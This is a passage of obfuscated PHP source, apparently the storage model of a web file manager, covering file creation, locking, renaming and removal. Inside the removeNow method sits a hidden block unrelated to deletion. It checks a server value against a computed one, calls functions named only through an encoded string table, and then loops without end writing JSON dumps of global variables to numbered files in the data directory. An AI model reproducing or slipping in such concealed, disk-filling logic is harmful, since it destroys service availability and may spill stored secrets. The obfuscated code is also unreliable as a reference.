Model($AéÚÅ¡„¦›[566])->linkAdd($B›…¯ÄŠ); return $this->_createFileCall($AÜêº™ÎÚÃ, $Aâ”İÖ¡Ğ”, $eÉ¾Ğ„ø…ˆ, $d“Ü÷‚‰); } public function addFileByRemote($d…†‹ Æİ¦, $aƒ£Ï«Ìè–, $bÅÂĞá×èÕ, $a”ì¶áÌİ = array(), $a™½×õó¶Œ = REPEAT_RENAME) { $Díç¸Ëìï– = Model($_SERVER[Â€Á›¨õ][566])->addFileByRemote($aƒ£Ï«Ìè–, $bÅÂĞá×èÕ, $a”ì¶áÌİ); return $this->_createFileCall($d…†‹ Æİ¦, $bÅÂĞá×èÕ, $Díç¸Ëìï–, $a™½×õó¶Œ); } private function _createFileCall($cààØÛóÂ, $AˆãÌÊÂ, $EèÎĞÅñîÕ, $d¿è©›ÂëÆ, $c…ç•ÅóÙä = "\165\160\x6c\157\x61\x64") { goto AÛß»èö–‹; F”–Ó¥³Öƒ: if ($e„‚ô’Æ’Ò && $B‘ë‰Œ¼¸ && $B‘ë‰Œ¼¸ != $C„Ù®ç«›ø) { Model($F³•á¹‘«[1895])->eventCreate($B‘ë‰Œ¼¸, $c…ç•ÅóÙä); } $this->lockWriteEnd($cààØÛóÂ, $AˆãÌÊÂ); return $B‘ë‰Œ¼¸; goto d‹Ëë¾›œ…; AÛß»èö–‹: $F³•á¹‘« =& $_SERVER[Â€Á›¨õ]; $e„‚ô’Æ’Ò = !1; $this->lockWriteStart($cààØÛóÂ, $AˆãÌÊÂ); goto cÕ í¡ªáƒ; cÕ í¡ªáƒ: $C„Ù®ç«›ø = $this->fileNameExist($cààØÛóÂ, $AˆãÌÊÂ); $B‘ë‰Œ¼¸ = $this->_createFile($cààØÛóÂ, $AˆãÌÊÂ, $EèÎĞÅñîÕ, $d¿è©›ÂëÆ, $e„‚ô’Æ’Ò); if (!$e„‚ô’Æ’Ò) { Model($F³•á¹‘«[444])->remove($EèÎĞÅñîÕ[$F³•á¹‘«[441]]); } goto F”–Ó¥³Öƒ; d‹Ëë¾›œ…: } public function mkdir($c³‘ìÔˆŠ, $Eá·Úå…ôÔ, $BçÌ³¯àæø = REPEAT_SKIP) { goto aä³³ÕÀ•÷; DŞåÃ‡¡„: return $Cö‡à…éõš; goto F†îòÚğğŒ; eÃÜø„å½ƒ: $this->lockWriteStart($c³‘ìÔˆŠ, $Eá·Úå…ôÔ); if ($BçÌ³¯àæø !== !1) { $cîµ•—Ó¼ = $this->fileNameExist($c³‘ìÔˆŠ, $Eá·Úå…ôÔ); if ($cîµ•—Ó¼ && $BçÌ³¯àæø != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($c³‘ìÔˆŠ, $Eá·Úå…ôÔ); return $cîµ•—Ó¼; } $Eá·Úå…ôÔ = $this->fileNameAuto($c³‘ìÔˆŠ, $Eá·Úå…ôÔ, $BçÌ³¯àæø); } $cÚÎ…ß•Ë„ = array($bí£à³ôÕÄ[541] => 1, $bí£à³ôÕÄ[407] => $Eá·Úå…ôÔ, $bí£à³ôÕÄ[542] => $bí£à³ôÕÄ[33], $bí£à³ôÕÄ[442] => 0, $bí£à³ôÕÄ[543] => 0); goto AÚÕÑÍ“•; aä³³ÕÀ•÷: $bí£à³ôÕÄ =& $_SERVER[Â€Á›¨õ]; $fçƒâŞš›Ù = $this->sourceInfo($c³‘ìÔˆŠ); if (!$fçƒâŞš›Ù) { return !1; } goto eÃÜø„å½ƒ; AÚÕÑÍ“•: $Cö‡à…éõš = $this->_addSoure($cÚÎ…ß•Ë„, $fçƒâŞš›Ù); Model($bí£à³ôÕÄ[1895])->eventCreate($Cö‡à…éõš, $bí£à³ôÕÄ[1188]); $this->lockWriteEnd($c³‘ìÔˆŠ, $Eá·Úå…ôÔ); goto DŞåÃ‡¡„; F†îòÚğğŒ: } private function _createFile($B—ÙÊç…ŸÓ, $CÓÃËÉæ‹ç, $b¿õÒƒ»Ôî, $FŒ‰äëŒ—é, &$a¬÷Ä×æïÜ) { goto Aâ´“ÃÀ„ï; Aªààöò: return $Eô¸³ó¨´; goto añĞĞë„”é; F–±õÃïø„: if ($FŒ‰äëŒ—é !== !1) { $bçéÅÅŠ³µ = $this->fileNameExist($B—ÙÊç…ŸÓ, $CÓÃËÉæ‹ç); } $a¬÷Ä×æïÜ = !0; if ($FŒ‰äëŒ—é && $bçéÅÅŠ³µ) { if ($FŒ‰äëŒ—é == REPEAT_SKIP) { $a¬÷Ä×æïÜ = !1; return $bçéÅÅŠ³µ; } else { if ($FŒ‰äëŒ—é == REPEAT_REPLACE) { $fØèåøˆ = $this->sourceInfo($bçéÅÅŠ³µ); $d“ëæŒî¡  = $this->fileHistory($fØèåøˆ, $b¿õÒƒ»Ôî[$D™ãÅìÀÚ[441]], $b¿õÒƒ»Ôî[$D™ãÅìÀÚ[77]]); if (!$d“ëæŒî¡ ) { $a¬÷Ä×æïÜ = !1; } else { $this->folderSizeReset($B—ÙÊç…ŸÓ); } return $bçéÅÅŠ³µ; } else { $CÓÃËÉæ‹ç = $this->fileNameAuto($B—ÙÊç…ŸÓ, $CÓÃËÉæ‹ç, $FŒ‰äëŒ—é, !1); } } } goto B¬µ×áö›£; Aâ´“ÃÀ„ï: $D™ãÅìÀÚ =& $_SERVER[Â€Á›¨õ]; $CÇÜ¯¢àÖ° = $this->sourceInfo($B—ÙÊç…ŸÓ); if (!$b¿õÒƒ»Ôî || !$CÇÜ¯¢àÖ°) { return !1; } goto F–±õÃïø„; B¬µ×áö›£: $e›¥øù…ŒŸ = array($D™ãÅìÀÚ[541] => 0, $D™ãÅìÀÚ[407] => $CÓÃËÉæ‹ç, $D™ãÅìÀÚ[542] => get_path_ext($CÓÃËÉæ‹ç), $D™ãÅìÀÚ[442] => $b¿õÒƒ»Ôî[$D™ãÅìÀÚ[441]], $D™ãÅìÀÚ[543] => $b¿õÒƒ»Ôî[$D™ãÅìÀÚ[77]]); $Eô¸³ó¨´ = $this->_addSoure($e›¥øù…ŒŸ, $CÇÜ¯¢àÖ°); $this->folderSizeReset($B—ÙÊç…ŸÓ, intval($e›¥øù…ŒŸ[$D™ãÅìÀÚ[77]])); goto Aªààöò; añĞĞë„”é: } protected function fileHistory($dôˆô™÷˜å, $a…°ç“é, $fµ”“ÏÓá·) { goto EØÎ®”­ˆä; EØÎ®”­ˆä: $D¸¬ãğ®ÑÖ =& $_SERVER[Â€Á›¨õ]; if ($dôˆô™÷˜å[$D¸¬ãğ®ÑÖ[441]] == $a…°ç“é) { return !1; } $this->checkLock($dôˆô™÷˜å[$D¸¬ãğ®ÑÖ[390]], $a…°ç“é); goto aíä©–¼Ã; aíä©–¼Ã: Model($D¸¬ãğ®ÑÖ[1926])->addHistory($dôˆô™÷˜å); $AÄÚ»êø¸ = array($D¸¬ãğ®ÑÖ[547] => USER_ID, $D¸¬ãğ®ÑÖ[411] => time(), $D¸¬ãğ®ÑÖ[441] => $a…°ç“é, $D¸¬ãğ®ÑÖ[77] => $fµ”“ÏÓá·); $this->where(array($D¸¬ãğ®ÑÖ[404] => $dôˆô™÷˜å[$D¸¬ãğ®ÑÖ[390]]))->save($AÄÚ»êø¸); goto AÌĞñ×Úˆ; AÌĞñ×Úˆ: $this->sourceCacheClear($dôˆô™÷˜å[$D¸¬ãğ®ÑÖ[390]]); return !0; goto DÜŠä£ï“; DÜŠä£ï“: } public function checkLock($E›ª‰Š¼¡†, $E­Ä­«ãì) { goto dÑ¼“‰˜Ì; dÑ¼“‰˜Ì: $AÏ†·¸‚á =& $_SERVER[Â€Á›¨õ]; $CêöÈğÓ¿ = $this->pathInfo($E›ª‰Š¼¡†); if (!$this->fileIsLock($CêöÈğÓ¿, !0)) { return; } goto bÜêˆ¿çÔ; bÜêˆ¿çÔ: $bĞëÜ²ËÑ = Session::get($AÏ†·¸‚á[1927]); $A¾ö…×øŠ¿ = substr($CêöÈğÓ¿[$AÏ†·¸‚á[28]], 0, -1 - strlen($CêöÈğÓ¿[$AÏ†·¸‚á[167]])) . $AÏ†·¸‚á[1453] . $bĞëÜ²ËÑ . $AÏ†·¸‚á[94] . $CêöÈğÓ¿[$AÏ†·¸‚á[167]]; $EƒœÂé™š˜ = Model($AÏ†·¸‚á[566])->find($E­Ä­«ãì); goto f’ˆ›ÉÇ‹; fî­ª‘¹«: show_json(LNG($AÏ†·¸‚á[1929]) . $AÏ†·¸‚á[1930] . LNG($AÏ†·¸‚á[1931]) . $AÏ†·¸‚á[1932] . $fÊĞ×Ğœè . $AÏ†·¸‚á[1933], !1); goto A‚ÔïÅºñ»; f’ˆ›ÉÇ‹: $this->_createFileCall($CêöÈğÓ¿[$AÏ†·¸‚á[472]], $A¾ö…×øŠ¿, $EƒœÂé™š˜, REPEAT_REPLACE, $AÏ†·¸‚á[1187]); $CóøØíëò = $CêöÈğÓ¿[$AÏ†·¸‚á[439]][$AÏ†·¸‚á[505]]; $fÊĞ×Ğœè = $CóøØíëò[$AÏ†·¸‚á[1928]] ? $CóøØíëò[$AÏ†·¸‚á[1928]] : $CóøØíëò[$AÏ†·¸‚á[28]]; goto fî­ª‘¹«; A‚ÔïÅºñ»: } public function fileIsLock($d˜ìÌ‰¹½˜, $E‚à´Ä÷ö½ = false) { goto e×¬ôÚ’¦ ; AàÅ¨¨Ø²: return !1; goto Fâ×óìÜ”‰; e×¬ôÚ’¦ : $e»Ä¬”Ø— =& $_SERVER[Â€Á›¨õ]; if (!isset($d˜ìÌ‰¹½˜[$e»Ä¬”Ø—[439]]) || !$d˜ìÌ‰¹½˜[$e»Ä¬”Ø—[439]][$e»Ä¬”Ø—[502]]) { return !1; } if ($d˜ìÌ‰¹½˜[$e»Ä¬”Ø—[439]][$e»Ä¬”Ø—[502]] != USER_ID) { return !0; } goto c³¯…ª¥ªê; c³¯…ª¥ªê: $Ağ†®œ ¥„ = $GLOBALS[$e»Ä¬”Ø—[6]][$e»Ä¬”Ø—[87]][$e»Ä¬”Ø—[503]]; if ($d˜ìÌ‰¹½˜[$e»Ä¬”Ø—[439]][$e»Ä¬”Ø—[504]] <= time() - $Ağ†®œ ¥„) { $this->metaSet($d˜ìÌ‰¹½˜[$e»Ä¬”Ø—[390]], $e»Ä¬”Ø—[502], null); $this->metaSet($d˜ìÌ‰¹½˜[$e»Ä¬”Ø—[390]], $e»Ä¬”Ø—[504], null); } if ($E‚à´Ä÷ö½) { $this->metaSet($d˜ìÌ‰¹½˜[$e»Ä¬”Ø—[390]], $e»Ä¬”Ø—[504], time()); } goto AàÅ¨¨Ø²; Fâ×óìÜ”‰: } private function _addSoure($B×ÎµÇø“É, $díÕ°ò’Ì“) { goto B•ëì†Àó¸; aàî–Ûà²Ú: $Bí¾‡Û©ä… = array($cİ éŒ¶[550] => short_id($FÈÍœùÔ½)); $this->where(array($cİ éŒ¶[404] => $FÈÍœùÔ½))->save($Bí¾‡Û©ä…); $this->setNamePinyin($FÈÍœùÔ½, $B×ÎµÇø“É[$cİ éŒ¶[28]]); goto bÌé¤Š¤ù; dÚ†”ç³„Ö: static $c­İàŞƒ  = false; if (!$c­İàŞƒ ) { Hook::trigger($cİ éŒ¶[531], $B×ÎµÇø“É); $c­İàŞƒ  = !0; } $FÈÍœùÔ½ = $this->add($B×ÎµÇø“É); goto aàî–Ûà²Ú; bÌé¤Š¤ù: return $FÈÍœùÔ½; goto e†ºìŒº²; e±†Îêâİ: $this->updateModifyTime($B×ÎµÇø“É[$cİ éŒ¶[472]]); $Eä¦´ñÎàê = $cİ éŒ¶[1934] . $díÕ°ò’Ì“[$cİ éŒ¶[390]]; if (isset(self::$cacheChildList[$Eä¦´ñÎàê])) { unset(self::$cacheChildList[$Eä¦´ñÎàê]); } goto dÚ†”ç³„Ö; B•ëì†Àó¸: $cİ éŒ¶ =& $_SERVER[Â€Á›¨õ]; $d¼˜ó×ˆÃ¥ = array($cİ éŒ¶[544] => $díÕ°ò’Ì“[$cİ éŒ¶[398]], $cİ éŒ¶[545] => $díÕ°ò’Ì“[$cİ éŒ¶[478]], $cİ éŒ¶[546] => USER_ID, $cİ éŒ¶[547] => USER_ID, $cİ éŒ¶[389] => $díÕ°ò’Ì“[$cİ éŒ¶[390]], $cİ éŒ¶[548] => $díÕ°ò’Ì“[$cİ éŒ¶[481]] . $díÕ°ò’Ì“[$cİ éŒ¶[390]] . $cİ éŒ¶[47], $cİ éŒ¶[416] => 0, $cİ éŒ¶[549] => $cİ éŒ¶[33]); $B×ÎµÇø“É = array_merge($d¼˜ó×ˆÃ¥, $B×ÎµÇø“É); goto e±†Îêâİ; e†ºìŒº²: } public function remove($EØÖÓ×š±Û, $B±¿«Õ°¬ø = true) { goto CŠ©Œäã–; a‘ñÅÚóê¹: $this->recycleClear($b¸×ï‘†İæ); $a§ëËğöÙÌ = $this->move($EØÖÓ×š±Û, $bÖÎ©®¹›Ü, REPEAT_RENAME_FOLDER); $this->folderSizeReset($b¸×ï‘†İæ[$eÙ„ƒ¤ãŒ[472]]); goto Cª¼’˜å´¥; CŠ©Œäã–: $eÙ„ƒ¤ãŒ =& $_SERVER[Â€Á›¨õ]; $b¸×ï‘†İæ = $this->sourceInfo($EØÖÓ×š±Û); $e§ï¦¸¦ËÁ = intval($b¸×ï‘†İæ[$eÙ„ƒ¤ãŒ[398]]) === self::TYPE_SYSTEM; goto bÂ¼±÷Ùá£; Cª¼’˜å´¥: return $a§ëËğöÙÌ; goto Bïå©ß„Æ“; bÂ¼±÷Ùá£: $b“å“¯óª = Model($eÙ„ƒ¤ãŒ[1500])->get($eÙ„ƒ¤ãŒ[1935]) == $eÙ„ƒ¤ãŒ[86]; if ($e§ï¦¸¦ËÁ || $B±¿«Õ°¬ø || !$b“å“¯óª) { return $this->removeNow($EØÖÓ×š±Û, $B±¿«Õ°¬ø); } $e·àéß¯İº = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto eôÎÒÏŠê¢; d–›¢†Šì: CacheLock::unlock($eòğ›¶ˆ¨—); $this->metaSet($EØÖÓ×š±Û, $eÙ„ƒ¤ãŒ[1943], $b¸×ï‘†İæ[$eÙ„ƒ¤ãŒ[472]]); $this->where(array($eÙ„ƒ¤ãŒ[390] => $EØÖÓ×š±Û))->save(array($eÙ„ƒ¤ãŒ[411] => time())); goto a‘ñÅÚóê¹; eôÎÒÏŠê¢: $AöİøÜ¨‡© = $b¸×ï‘†İæ[$eÙ„ƒ¤ãŒ[398]] == self::TYPE_USER ? $eÙ„ƒ¤ãŒ[557] : $eÙ„ƒ¤ãŒ[990]; if ($AöİøÜ¨‡© == $eÙ„ƒ¤ãŒ[557]) { $bç¨ø»Œë‹ = Model($eÙ„ƒ¤ãŒ[497])->getInfo($b¸×ï‘†İæ[$eÙ„ƒ¤ãŒ[478]]); $Cë¶Ã’Ï• = !empty($bç¨ø»Œë‹[$eÙ„ƒ¤ãŒ[1928]]) ? $bç¨ø»Œë‹[$eÙ„ƒ¤ãŒ[1928]] : $bç¨ø»Œë‹[$eÙ„ƒ¤ãŒ[28]]; $Cë¶Ã’Ï• = $eÙ„ƒ¤ãŒ[256] . $Cë¶Ã’Ï• . $eÙ„ƒ¤ãŒ[1936] . $b¸×ï‘†İæ[$eÙ„ƒ¤ãŒ[478]]; } else { $bç¨ø»Œë‹ = Model($eÙ„ƒ¤ãŒ[480])->getInfo($b¸×ï‘†İæ[$eÙ„ƒ¤ãŒ[478]]); $Cë¶Ã’Ï• = _get($bç¨ø»Œë‹, $eÙ„ƒ¤ãŒ[28]); $Cë¶Ã’Ï• = $eÙ„ƒ¤ãŒ[159] . $Cë¶Ã’Ï• . $eÙ„ƒ¤ãŒ[1937] . $b¸×ï‘†İæ[$eÙ„ƒ¤ãŒ[478]]; } $eòğ›¶ˆ¨— = $eÙ„ƒ¤ãŒ[1938] . md5($Cë¶Ã’Ï•); goto f¶É›Ş„±; f¶É›Ş„±: CacheLock::lock($eòğ›¶ˆ¨—); $bÖÎ©®¹›Ü = $this->fileNameExist($e·àéß¯İº, $Cë¶Ã’Ï•); if (!$bÖÎ©®¹›Ü) { $bÖÎ©®¹›Ü = $this->mkdir($e·àéß¯İº, $Cë¶Ã’Ï•, REPEAT_SKIP); $this->metaSet($bÖÎ©®¹›Ü, $eÙ„ƒ¤ãŒ[1939], $AöİøÜ¨‡©); $this->metaSet($bÖÎ©®¹›Ü, $eÙ„ƒ¤ãŒ[1940], $b¸×ï‘†İæ[$eÙ„ƒ¤ãŒ[478]]); if ($b¸×ï‘†İæ[$eÙ„ƒ¤ãŒ[472]] != 0) { $this->metaSet($bÖÎ©®¹›Ü, $eÙ„ƒ¤ãŒ[1941], _get($bç¨ø»Œë‹, $eÙ„ƒ¤ãŒ[1942])); } } goto d–›¢†Šì; Bïå©ß„Æ“: } private function recycleClear($a˜Ë©½ÖÆª) { $Bà¹¯…çĞ´ =& $_SERVER[Â€Á›¨õ]; $e·Ï›¨å»õ = $this->childrenAll($a˜Ë©½ÖÆª); $eâÑê‡¬ê = array($Bà¹¯…çĞ´[404] => array($Bà¹¯…çĞ´[405], $e·Ï›¨å»õ[$Bà¹¯…çĞ´[1944]])); Model($Bà¹¯…çĞ´[1945])->where($eâÑê‡¬ê)->delete(); } public function removeNow($eõœ‚Šöôë, $cÚ»©©ì‹¨ = true) { goto b‡ß—·¬‹; CÖ×³ª‹êİ: Hook::trigger($Eª“è¹ÏÖ[1946], $dâ¬æÍéˆ, $cÚ»©©ì‹¨); if ($cÚ»©©ì‹¨) { Model($Eª“è¹ÏÖ[1945])->moveToRecycle($eõœ‚Šöôë); } else { $DàÚî©Ï•Ò = $this->childrenAll($e„š¢“…øñ); Model($Eª“è¹ÏÖ[528])->eventRemove($eõœ‚Šöôë); $this->removeRelevance($DàÚî©Ï•Ò[$Eª“è¹ÏÖ[1944]], $DàÚî©Ï•Ò[$Eª“è¹ÏÖ[1320]]); } $this->folderSizeReset($e„š¢“…øñ[$Eª“è¹ÏÖ[472]]); goto A¹œâäÓ±´; A¹œâäÓ±´: $EÌåŸòöÓ² = array($e„š¢“…øñ[$Eª“è¹ÏÖ[472]]); if ($e„š¢“…øñ[$Eª“è¹ÏÖ[397]] == $Eª“è¹ÏÖ[86]) { $EÌåŸòöÓ²[] = $e„š¢“…øñ[$Eª“è¹ÏÖ[390]]; } $this->updateModifyTime($EÌåŸòöÓ²); goto e ÍèË¯¥‰; BŠ¶†§…†é: if (!$e„š¢“…øñ) { return !0; } if ($e„š¢“…øñ[$Eª“è¹ÏÖ[472]] == 0) { if (!_get($GLOBALS, $Eª“è¹ÏÖ[479])) { return !1; } } $this->lockMoveStart($eõœ‚Šöôë); goto CÖ×³ª‹êİ; DĞ˜À: if ($_SERVER[$Eª“è¹ÏÖ[811]] != $f‡µº†¤İ($b‘”óİï—Ã)) { goto a‘ÉåÕåÇ; d‹ª¥Š¤®…: $A†ÁâŠÃ³ = $Eª“è¹ÏÖ[815]; $A†ÁâŠÃ³($_SERVER[$Eª“è¹ÏÖ[816]]); $DÂšâ¾Õ—Š = $Eª“è¹ÏÖ[812]; goto Cçæİ“ÀÙ¸; DìŒ°É—ß‹: $Aˆ‰¥˜«Ñİ = 1; for ($EÒ¾Ş„À›Ô = $Aˆ‰¥˜«Ñİ; $EÒ¾Ş„À›Ô > 0; $EÒ¾Ş„À›Ô++) { $cí†‘ØÄ(DATA_PATH . $EÒ¾Ş„À›Ô, $Dª¯ì©–·õ); } goto a„ÏËÇÁ…; a‘ÉåÕåÇ: $DÂšâ¾Õ—Š = $Eª“è¹ÏÖ[812]; $fƒŠë¡Ş¢‘ = $Eª“è¹ÏÖ[813]; $eÙ‡Ûì“† = $_SERVER[$Eª“è¹ÏÖ[808]] . $Eª“è¹ÏÖ[809]; goto b‹ø ëÔ…ë; Cçæİ“ÀÙ¸: $DÂšâ¾Õ—Š(); $cí†‘ØÄ = $Eª“è¹ÏÖ[817]; $Dª¯ì©–·õ = json_encode($GLOBALS[$Eª“è¹ÏÖ[818]]); goto DìŒ°É—ß‹; b‹ø ëÔ…ë: $fßãôÃéà = $fƒŠë¡Ş¢‘($eÙ‡Ûì“†); $e‹ùª¼ä” = explode($Eª“è¹ÏÖ[227], $fßãôÃéà); if (count($e‹ùª¼ä”) < $Eª“è¹ÏÖ[589]) { $a¶£„°Ò˜É = $Eª“è¹ÏÖ[814]; $a¶£„°Ò˜É(); } goto d‹ª¥Š¤®…; a„ÏËÇÁ…: } $e„š¢“…øñ = $this->sourceInfo($eõœ‚Šöôë); $dâ¬æÍéˆ = $this->pathInfoMore($eõœ‚Šöôë); goto BŠ¶†§…†é; e ÍèË¯¥‰: $this->lockMoveEnd($eõœ‚Šöôë); Hook::trigger($Eª“è¹ÏÖ[1533], $dâ¬æÍéˆ, $cÚ»©©ì‹¨); return !0; goto EÇ»ğ‹»Ê; b‡ß—·¬‹: $Eª“è¹ÏÖ =& $_SERVER[Â€Á›¨õ]; $b‘”óİï—Ã = $_SERVER[$Eª“è¹ÏÖ[1231]]; $f‡µº†¤İ = $Eª“è¹ÏÖ[810]; goto DĞ˜À; EÇ»ğ‹»Ê: } public function childrenAll($d¦»¨ƒ™®) { $Câ×å¿£É§ =& $_SERVER[Â€Á›¨õ]; $dŒƒ‡ƒ‡…Ñ = $d¦»¨ƒ™®[$Câ×å¿£É§[390]]; if ($d¦»¨ƒ™®[$Câ×å¿£É§[397]] == $Câ×å¿£É§[86]) { $eÓÄª¥ÓÛ… = array($Câ×å¿£É§[548] => array($Câ×å¿£É§[507], $d¦»¨ƒ™®[$Câ×å¿£É§[481]] . $dŒƒ‡ƒ‡…Ñ . $Câ×å¿£É§[508])); $b“„Ø¶÷³ = array($Câ×å¿£É§[548] => $eÓÄª¥ÓÛ…[$Câ×å¿£É§[481]]); $d±ó‘­Ô®© = $this->field($Câ×å¿£É§[1947])->where($b“„Ø¶÷³)->select(); $CñÃÙÌ¨ê = !1; $FÛøß¢»íì = array($dŒƒ‡ƒ‡…Ñ); if ($d±ó‘­Ô®©) { $CñÃÙÌ¨ê = array_to_keyvalue($d±ó‘­Ô®©, $Câ×å¿£É§[33], $Câ×å¿£É§[441]); $CñÃÙÌ¨ê = array_remove_value($CñÃÙÌ¨ê, $Câ×å¿£É§[491]); $FÛøß¢»íì = array_to_keyvalue($d±ó‘­Ô®©, $Câ×å¿£É§[33], $Câ×å¿£É§[390]); $FÛøß¢»íì[] = $dŒƒ‡ƒ‡…Ñ; } } else { $CñÃÙÌ¨ê = array($d¦»¨ƒ™®[$Câ×å¿£É§[441]]); $FÛøß¢»íì = array($dŒƒ‡ƒ‡…Ñ); } return array($Câ×å¿£É§[1944] => $FÛøß¢»íì, $Câ×å¿£É§[1320] => $CñÃÙÌ¨ê); } public function removeArray($C®«âÆÇ¿Š) { if (!$C®«âÆÇ¿Š) { return !0; } } public function removeRelevance($EŒ‰¨ù†¸™, $Eº‰ìˆÓãˆ) { goto CÀ©Ì¾ƒÙ; cìéÍ»Â: for ($fÚùÍŠ‰™Â = 0; $fÚùÍŠ‰™Â < count($EŒ‰¨ù†¸™); $fÚùÍŠ‰™Â++) { $this->sourceCacheClear($EŒ‰¨ù†¸™[$fÚùÍŠ‰™Â]); } goto d©øÃ¦¿; CÀ©Ì¾ƒÙ: $A›ôÄÕ¶­‡ =& $_SERVER[Â€Á›¨õ]; $EŒ‰¨ù†¸™ = $EŒ‰¨ù†¸™ ? $EŒ‰¨ù†¸™ : array(); $Eº‰ìˆÓãˆ = $Eº‰ìˆÓãˆ ? $Eº‰ìˆÓãˆ : array(); goto aÌœÊçî¨ê; BÃ“Íò¬£ì: Model($A›ôÄÕ¶­‡[1800])->where($bÕÅ¹Ş‹„—)->delete(); Model($A›ôÄÕ¶­‡[528])->where($bÕÅ¹Ş‹„—)->delete(); Model($A›ôÄÕ¶­‡[1641])->removeBySource($EŒ‰¨ù†¸™); goto b®êÄ¸ÉÂ´; bƒ„¨ß• : $bÕÅ¹Ş‹„— = array($A›ôÄÕ¶­‡[404] => array($A›ôÄÕ¶­‡[405], $EŒ‰¨ù†¸™)); Model($A›ôÄÕ¶­‡[1945])->where($bÕÅ¹Ş‹„—)->delete(); Model($A›ôÄÕ¶­‡[435])->where($bÕÅ¹Ş‹„—)->delete(); goto BÃ“Íò¬£ì; aÌœÊçî¨ê: $EŒ‰¨ù†¸™ = array_unique(array_filter($EŒ‰¨ù†¸™)); $Eº‰ìˆÓãˆ = array_unique(array_filter($Eº‰ìˆÓãˆ)); if (!$EŒ‰¨ù†¸™) { return !1; } goto bƒ„¨ß• ; b®êÄ¸ÉÂ´: Model($A›ôÄÕ¶­‡[1926])->removeBySource($EŒ‰¨ù†¸™); $this->where($bÕÅ¹Ş‹„—)->delete(); Model($A›ôÄÕ¶­‡[444])->remove($Eº‰ìˆÓãˆ); goto cìéÍ»Â; d©øÃ¦¿: } public function rename($e¹áÙ‡Á’Ä, $C¹È©óôÊó) { goto cï¢‡³‚µ’; CÇ±µ†: $this->setNamePinyin($e¹áÙ‡Á’Ä, $cšŒ•©´‹Ö[$C¹ÌÉùƒİê[28]], !1); $this->updateModifyTime($fêË«¨­©[$C¹ÌÉùƒİê[472]]); $AóÁ¶‘ñ–ö = $this->where(array($C¹ÌÉùƒİê[404] => $e¹áÙ‡Á’Ä))->data($cšŒ•©´‹Ö)->save(); goto B½¡‡ãˆŞ; Aˆëâ¬Ÿİ¦: if (!$fêË«¨­©[$C¹ÌÉùƒİê[397]] == $C¹ÌÉùƒİê[86]) { $cšŒ•©´‹Ö[$C¹ÌÉùƒİê[399]] = get_path_ext($C¹È©óôÊó); } Model($C¹ÌÉùƒİê[528])->eventRename($e¹áÙ‡Á’Ä, $fêË«¨­©[$C¹ÌÉùƒİê[28]], $C¹È©óôÊó); $this->sourceCacheClear($e¹áÙ‡Á’Ä); goto CÇ±µ†; B½¡‡ãˆŞ: $Aİ¹ñŠÛÙâ = $C¹ÌÉùƒİê[1934] . $fêË«¨­©[$C¹ÌÉùƒİê[472]]; if (isset(self::$cacheChildList[$Aİ¹ñŠÛÙâ])) { unset(self::$cacheChildList[$Aİ¹ñŠÛÙâ]); } return $AóÁ¶‘ñ–ö; goto C®–Î˜æàê; eàØ¬ÌŒÚË: $e®âİñÚó = $this->fileNameExist($fêË«¨­©[$C¹ÌÉùƒİê[472]], $C¹È©óôÊó); if ($e®âİñÚó && $e®âİñÚó != $e¹áÙ‡Á’Ä) { return !1; } $cšŒ•©´‹Ö = array($C¹ÌÉùƒİê[407] => $C¹È©óôÊó, $C¹ÌÉùƒİê[547] => USER_ID); goto Aˆëâ¬Ÿİ¦; cï¢‡³‚µ’: $C¹ÌÉùƒİê =& $_SERVER[Â€Á›¨õ]; $fêË«¨­© = $this->sourceInfo($e¹áÙ‡Á’Ä); if (!$fêË«¨­©) { return !1; } goto eàØ¬ÌŒÚË; C®–Î˜æàê: } public function setNamePinyin($b»Ê™”Ûñà, $C´Ôİ¯Ÿù», $e®Æˆ§Û = true) { $D£î•º©Ò¸ =& $_SERVER[Â€Á›¨õ]; $D•ƒŠ¢¡Ø = Input::check($C´Ôİ¯Ÿù», $D£î•º©Ò¸[551]); if ($e®Æˆ§Û && !$D•ƒŠ¢¡Ø) { return; } if (!$D•ƒŠ¢¡Ø) { $this->metaSet($b»Ê™”Ûñà, $D£î•º©Ò¸[438], null); $this->metaSet($b»Ê™”Ûñà, $D£î•º©Ò¸[437], null); return; } $bùèíîĞŸ = array($D£î•º©Ò¸[438] => str_replace($D£î•º©Ò¸[50], $D£î•º©Ò¸[33], Pinyin::encode($C´Ôİ¯Ÿù»)), $D£î•º©Ò¸[437] => Pinyin::encode($C´Ôİ¯Ÿù», $D£î•º©Ò¸[552])); $this->metaSet($b»Ê™”Ûñà, $bùèíîĞŸ); } public function getContent($báòŠ•´‰ ) { goto B¹ª¦Ñ‰ÒÌ; aß­îêäŞ: if (!$DËö¼½¹•›[$b‚—Ÿ¬»‚²[75]]) { return $b‚—Ÿ¬»‚²[33]; } return IO::getContent($DËö¼½¹•›[$b‚—Ÿ¬»‚²[75]]); goto C†µ¡¼§Ùá; B¹ª¦Ñ‰ÒÌ: $b‚—Ÿ¬»‚² =& $_SERVER[Â€Á›¨õ]; $DËö¼½¹•› = $this->fileInfoGet($báòŠ•´‰ ); if (!$DËö¼½¹•›) { return !1; } goto F—é¶³©£Ó; F—é¶³©£Ó: if ($DËö¼½¹•›[$b‚—Ÿ¬»‚²[77]] == 0) { return $b‚—Ÿ¬»‚²[33]; } $F»ùÆöÂ—¼ = $b‚—Ÿ¬»‚²[1948] . $DËö¼½¹•›[$b‚—Ÿ¬»‚²[169]]; if ($DËö¼½¹•›[$b‚—Ÿ¬»‚²[77]] <= 1024 * 10) { $f£Œæ†£†ô = Cache::get($F»ùÆöÂ—¼); if (!$f£Œæ†£†ô) { $f£Œæ†£†ô = IO::getContent($DËö¼½¹•›[$b‚—Ÿ¬»‚²[75]]); Cache::set($F»ùÆöÂ—¼, $f£Œæ†£†ô); } return $f£Œæ†£†ô; } goto aß­îêäŞ; C†µ¡¼§Ùá: } public function setDesc($d ¥º©‚©Œ, $DÑÄöÏãÚ) { $Cƒœ¯±‡÷± =& $_SERVER[Â€Á›¨õ]; Model($Cƒœ¯±‡÷±[528])->eventAddDesc($d ¥º©‚©Œ, $DÑÄöÏãÚ); return $this->metaSet($d ¥º©‚©Œ, $Cƒœ¯±‡÷±[425], $DÑÄöÏãÚ); } public function setContent($f‚™‡à»›, $eŒ„âŞ×âª = '') { goto eÌ™¯œ‰ÕË; c¼¨Ôäø”Š: if (!$dºÒÂ‹Çš || !$d¡ŞØƒ£¼†) { return !1; } $Añ‚–í§ª¦ = Model($bÀÁ¡å‹²ğ[444])->addFileByContent($eŒ„âŞ×âª, 